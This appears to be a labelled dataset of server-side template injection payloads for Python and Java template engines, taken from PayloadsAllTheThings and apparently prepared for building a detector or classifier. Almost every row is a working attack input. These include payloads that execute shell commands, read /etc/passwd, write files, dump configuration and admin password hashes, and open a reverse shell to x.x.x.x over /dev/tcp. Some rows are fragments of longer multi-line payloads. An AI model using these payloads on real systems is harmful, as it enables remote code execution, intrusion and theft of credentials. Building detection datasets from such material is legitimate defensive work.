{{ 7*7 }}  # Error with Django Templates,{{N*N}}#errorwithdjangotemplates,python,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,ihNvr{{N|add:N}}dNr#burppayload->ihNvrNdNr,python,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ '<script>alert(3)</script>' }},{{'S'}},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ '<script>alert(3)</script>' | safe }},{{'S'|safe}},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ messages.storages.0.signer.key }},{{messages.storages.N.signer.key}},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% include 'admin/base.html' %},{%include'S'%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},{%loadlog%}{%get_admin_logNaslog%}{%foreinlog%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{e.user.get_username}} : {{e.user.password}}{% endfor %},{{e.user.get_username}}:{{e.user.password}}{%endfor%},python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% get_admin_log 10 as admin_log for_user user %},{%get_admin_logNasadmin_logfor_useruser%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{7*'7'}} would result in 7777777,{{N*'S'}}wouldresultinN,python,unknown,1,probe,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{% extends ""layout.html"" %}","{%extends""S""%}",python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% block body %},{%blockbody%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% for user in users %},{%foruserinusers%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>","<li><ahref=""S"">{{user.username}}</a></li>",python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% endfor %},{%endfor%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{% endblock %},{%endblock%},python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<pre>{% debug %}</pre>,<pre>{%debug%}</pre>,python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__ }},{{self.__init__.__globals__.__builtins__}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{% for key, value in config.iteritems() %}","{%forkey,valueinconfig.iteritems()%}",python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<dt>{{ key|e }}</dt>,<dt>{{key|e}}</dt>,python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
<dd>{{ value|e }}</dd>,<dd>{{value|e}}</dd>,python,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}","{{config.items()[N][N].__class__.__mro__[N].__subclasses__()[N](""S"").read()}}",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ get_flashed_messages.__globals__.__builtins__.open(""/etc/passwd"").read() }}","{{get_flashed_messages.__globals__.__builtins__.open(""S"").read()}}",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},{{self.__init__.__globals__.__builtins__.__import__('S').popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.cycler.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},{{self._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ cycler.__init__.__globals__.os.popen('id').read() }},{{cycler.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ joiner.__init__.__globals__.os.popen('id').read() }},{{joiner.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ namespace.__init__.__globals__.os.popen('id').read() }},{{namespace.__init__.__globals__.os.popen('S').read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ cycler.__init__.__globals__.__builtins__.getattr("""", ""x"" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based","{{cycler.__init__.__globals__.__builtins__.getattr(""S"",""S""+cycler.__init__.__globals__.os.popen('S').read())}}#error-based",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ 1 / (cycler.__init__.__globals__.os.popen(""id"")._proc.wait() == 0) }} # Boolean-Based","{{N/(cycler.__init__.__globals__.os.popen(""S"")._proc.wait()==N)}}#boolean-based",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ lipsum.__globals__[""os""].popen('id').read() }}","{{lipsum.__globals__[""S""].popen('S').read()}}",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},{{config.from_pyfile('S')}},python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"{{ config['RUNCMD']('/bin/bash -c ""/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1""',shell=True) }}","{{config['S']('S',shell=true)}}",python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}},{{self._templatereference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[N:N]).read()}},python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_","http://localhost:N/?exploit={{request|attr([request.args.usc*N,request.args.class,request.args.usc*N]|join)}}&class=class&usc=_",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_","http://localhost:N/?exploit={{request|attr((request.args.usc*N,request.args.class,request.args.usc*N)|join)}}&class=class&usc=_",python,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,http://localhost:N/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_","http://localhost:N/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_",python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{{os.system('whoami')}},{{os.system('S')}},python,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
{%import os%}{{os.system('nslookup oastify.com')}},{%importos%}{{os.system('S')}},python,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
">>> print(Template(""${self.module.cache.util.os}"").render())",">>>print(template(""S"").render())",python,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}","${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[N,N])).read()}",python,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
"<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}","<%importos%>${os.popen(str().join(chr(i)for(i)in[N,N])).read()}",python,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Python.md
${class.getClassLoader()},${class.getclassloader()},java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${class.getResource(""../../../../../index.htm"").getContent()}","${class.getresource(""S"").getcontent()}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE,${'S'.getclass().forname('S').getconstructor('S'.getclass().forname('S')).newinstance('S'.getclass().forname('S').getruntime().exec('S').inputstream.readallbytes())}//renderedrce,java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE,${'S'.getclass().forname('S').valueof('S'+'S'.getclass().forname('S').getconstructor('S'.getclass().forname('S')).newinstance('S'.getclass().forname('S').getruntime().exec('S').inputstream.readallbytes()))}//error-basedrce,java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE,${N/(('S'.getclass().forname('S').getruntime().exec('S').waitfor()==N)?N:N)+'S'}//boolean-basedrce,java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE,${('S'.getclass().forname('S').getruntime().exec('S').waitfor().equals(N)?('S'.getclass().forname('S')).sleep(N):N).tostring()}//time-basedrce,java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join("" "")}","${product.getclass().getprotectiondomain().getcodesource().getlocation().touri().resolve('S').tourl().openstream().readallbytes()?join(""S"")}",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#{""freemarker.template.utility.Execute""?new()(""id"")}","#{""S""?new()(""S"")}",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${(""xx""+(""freemarker.template.utility.Execute""?new()(""id"")))?new()} // Error-Based RCE","${(""S""+(""S""?new()(""S"")))?new()}//error-basedrce",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${1/((freemarker.template.utility.Execute""?new()("" … && echo UniqueString"")?chop_linebreak?ends_with(""UniqueString""))?string('1','0')?eval)} // Boolean-Based RCE","${N/((freemarker.template.utility.execute""S""…&&echouniquestring""S""uniquestring""))?string('S','S')?eval)}//boolean-basedrce",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${""freemarker.template.utility.Execute""?new()(""id && sleep 5"")} // Time-Based RCE","${""S""?new()(""S"")}//time-basedrce",java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{{'a'.toUpperCase()}} would result in 'A',{{'S'.touppercase()}}wouldresultin'S',java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206,{{request}}wouldreturnarequestobjectlikecom.[...].context.templatecontextrequest@N,java,unknown,1,enumeration,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{% set cmd = 'id' %},{%setcmd='S'%},java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{% set bytes = (1).TYPE,{%setbytes=(N).type,java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
{{ (1).TYPE,{{(N).type,java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
.newInstance(([bytes]).toArray()) }},.newinstance(([bytes]).toarray())}},java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""whoami""))","#set($ex=$class.inspect(""S"").type.getruntime().exec(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($out=$ex.getInputStream()),#set($out=$ex.getinputstream()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#foreach($i in [1..$out.available()]),#foreach($iin[N..$out.available()]),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($base64EncodedCommand = 'd2hvYW1p'),#set($baseNencodedcommand='S'),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($contextObjectClass = $knownContextObject.getClass()),#set($contextobjectclass=$knowncontextobject.getclass()),java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($Base64Class = $contextObjectClass.forName(""java.util.Base64""))","#set($baseNclass=$contextobjectclass.forname(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($Base64Decoder = $Base64Class.getMethod(""getDecoder"").invoke(null))","#set($baseNdecoder=$baseNclass.getmethod(""S"").invoke(null))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand)),#set($decodedbytes=$baseNdecoder.decode($baseNencodedcommand)),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($StringClass = $contextObjectClass.forName(""java.lang.String""))","#set($stringclass=$contextobjectclass.forname(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($command = $StringClass.getConstructor($contextObjectClass.forName(""[B""), $contextObjectClass.forName(""java.lang.String"")).newInstance($decodedBytes, ""UTF-8""))","#set($command=$stringclass.getconstructor($contextobjectclass.forname(""S""),$contextobjectclass.forname(""S"")).newinstance($decodedbytes,""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($commandArgs = [""/bin/sh"", ""-c"", $command])","#set($commandargs=[""S"",""S"",$command])",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ProcessBuilderClass = $contextObjectClass.forName(""java.lang.ProcessBuilder""))","#set($processbuilderclass=$contextobjectclass.forname(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName(""java.util.List"")).newInstance($commandArgs))","#set($processbuilder=$processbuilderclass.getconstructor($contextobjectclass.forname(""S"")).newinstance($commandargs))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($processBuilder = $processBuilder.redirectErrorStream(true)),#set($processbuilder=$processbuilder.redirecterrorstream(true)),java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($process = $processBuilder.start()),#set($process=$processbuilder.start()),java,unknown,1,direct-execution,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($exitCode = $process.waitFor()),#set($exitcode=$process.waitfor()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($inputStream = $process.getInputStream()),#set($inputstream=$process.getinputstream()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($ScannerClass = $contextObjectClass.forName(""java.util.Scanner""))","#set($scannerclass=$contextobjectclass.forname(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName(""java.io.InputStream"")).newInstance($inputStream))","#set($scanner=$scannerclass.getconstructor($contextobjectclass.forname(""S"")).newinstance($inputstream))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($scannerDelimiter = $scanner.useDelimiter(""\\A""))","#set($scannerdelimiter=$scanner.usedelimiter(""S""))",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($output = $scanner.next().trim()),#set($output=$scanner.next().trim()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($sc=$s.getClass().getConstructor($s.getClass().forName(""[B""), $s.getClass()))","#set($sc=$s.getclass().getconstructor($s.getclass().forname(""S""),$s.getclass()))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id"")","#set($p=$s.getclass().forname(""S"").getruntime().exec(""S"")",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($n=$p.waitFor()),#set($n=$p.waitfor()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($b=""Y:/A:/""+$sc.newInstance($p.inputStream.readAllBytes(), ""UTF-8""))","#set($b=""S""+$sc.newinstance($p.inputstream.readallbytes(),""S""))",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($p=$s.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""id""))","#set($p=$s.getclass().forname(""S"").getruntime().exec(""S""))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
#set($r=$p.exitValue()),#set($r=$p.exitvalue()),java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"#set($t=$s.getClass().forName(""java.lang.Thread"").sleep(5000))","#set($t=$s.getclass().forname(""S"").sleep(N))",java,unknown,1,introspection,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${String x = new File('c:/windows/notepad.exe').text},${stringx=newfile('S').text},java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
${String x = new File('/path/to/file').getText('UTF-8')},${stringx=newfile('S').gettext('S')},java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
"${new File(""C:\Temp\FileName.txt"").createNewFile();}","${newfile(""S"").createnewfile();}",java,unknown,1,uncertain,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Java.md
